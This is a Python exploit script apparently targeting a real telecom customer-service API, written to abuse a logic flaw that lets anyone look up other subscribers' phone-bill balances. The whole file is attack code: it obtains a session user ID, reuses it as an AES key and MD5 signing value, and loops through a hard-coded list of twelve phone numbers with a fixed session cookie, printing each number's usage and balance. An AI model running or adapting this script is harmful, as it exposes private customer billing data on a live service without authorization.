# -*- encoding: utf-8 -*-
# TODO:@ModuleName: 逻辑漏洞-任意用户话费查询
# TODO:@Author: tomato
# TODO:@Version: Python3.12.0
# TODO:@Time: 2025/6/5 11:02
import requests
import re
from diy_func import timer
import hashlib
import os
from Crypto.Cipher import AES
import base64
from Crypto.Util.Padding import pad


class SearchPhoneInfo:
    """ TODO:查询手机号话费信息 """
    def __init__(self, Apptoken, Cookie):
        self.Apptoken = Apptoken
        self.Cookie = Cookie
        self.headers = {
            "Cookie": self.Cookie,
            "Origin": "https://khfwpt-css.anhuitelecom.com:11981",
            "Apptoken": self.Apptoken,
            "Accept": "application/json",
            "Priority": "u=0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0",
            "Referer": "https://khfwpt-css.anhuitelecom.com:11981/imWebPortal/home",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Site": "same-origin",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "Te": "trailers",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Parametermac": "",
            "Content-Type": "application/json;charset=UTF-8"
        }
        self.getid_url = "https://khfwpt-css.anhuitelecom.com:11981/imServer/service/CustomStaffReqService/queryCustomerPhoneInfo/0"
        self.getinfo_url = "https://khfwpt-css.anhuitelecom.com:11981/imServer/service/CustomStaffReqService/getAQuestionReplyByOneMsg/0"
        self.getuserid_url = "https://khfwpt-css.anhuitelecom.com:11981/imServer/service/CustomStaffReqService/handleUserSession/0"

    def md5(self, phone):
        """ TODO:md5加密 """
        Parametermac = phone + self.Apptoken
        Parametermac = hashlib.md5(Parametermac.encode()).hexdigest()
        return Parametermac

    def get_phoneid(self, phone):
        """ TODO:获取手机号对应的ID"""
        getid_data = {
            "phone": phone
        }
        getid_response = requests.post(self.getid_url, headers=self.headers, json=getid_data).json()
        return getid_response['customerInfo']['id']

    def get_phone_info(self, phone):
        """ TODO:获取手机号话费信息 """
        phoneid = self.get_phoneid(phone)
        getinfo_data = {
            "content": "查话费",
            "customerInfoID": phoneid
        }
        getinfo_response = requests.post(self.getinfo_url, headers=self.headers, json=getinfo_data).json()
        return getinfo_response['content']

    def get_user_id(self):
        """ TODO:获取用户ID """
        get_user_id_data = {
            "staffPhone": ""
        }
        response = requests.post(self.getuserid_url, headers=self.headers, json=get_user_id_data).json()
        user_id = response["userID"]
        # print(user_id)
        return user_id

    @staticmethod
    def aes_encrypt(plaintext: str, key_hex: str) -> str:
        """ TODO:AES加密 """
        key = key_hex.encode('utf-8').ljust(32, b'\x00')[:32]
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        return base64.b64encode(iv + ct).decode()

    @staticmethod
    def extract_phone_info(content):
        """ TODO:提取话费信息 """
        clean_content = re.sub(r'<[^>]+>', '', content)
        phone_pattern = r'号码：(\d+)'
        phone_match = re.search(phone_pattern, clean_content)
        used_pattern = r'本月已使用：([\d.]+元)'
        used_match = re.search(used_pattern, clean_content)
        balance_pattern = r'当前结余：([\d.]+元)'
        balance_match = re.search(balance_pattern, clean_content)
        total_pattern = r'余额([\d.]+元)'
        total_match = re.search(total_pattern, clean_content)
        if phone_match and used_match and balance_match and total_match:
            phone = phone_match.group(1)
            used = used_match.group(1)
            balance = balance_match.group(1)
            total = total_match.group(1)
            return f"您好，截止至2025-06-05，您的话费情况如下：号码：{phone}本月已使用：{used},当前结余：{balance} = 余额{total} - 本月已使用{used}"
        else:
            return clean_content.strip()

    def run(self, phone_num):
        """ TODO: 执行查询所有手机号的话费信息 """
        for phone in phone_num:
            try:
                self.headers["Parametermac"] = self.md5(phone)
                content = self.get_phone_info(phone)
                formatted_info = self.extract_phone_info(content)
                print(formatted_info)
            except Exception as e:
                print(f"查询号码 {phone} 时出错: {e}")


if __name__ == "__main__":
    end_timer = timer.exec_time()
    phone_list = ["15305511797", "15305513361", "18096603202", "15305513782", "15305515213", "15348213308",
                  "17718147716", "17718147717", "17718147718",  "17718147719", "17718147720", "17718147721",]
    cookie = "JSESSIONID=5B27D5E684ED28FC7D26FAA1EE6B5BF2"
    dummy = SearchPhoneInfo("", cookie)
    # TODO: 此时的imuserid作为key
    imuserid = dummy.get_user_id()
    # TODO: 将手机号列表AES加密然后传入原来的请求
    aes_phone_list = [dummy.aes_encrypt(phone,  imuserid) for phone in phone_list]
    searcher = SearchPhoneInfo(imuserid, cookie)
    searcher.run(aes_phone_list)
    end_timer()
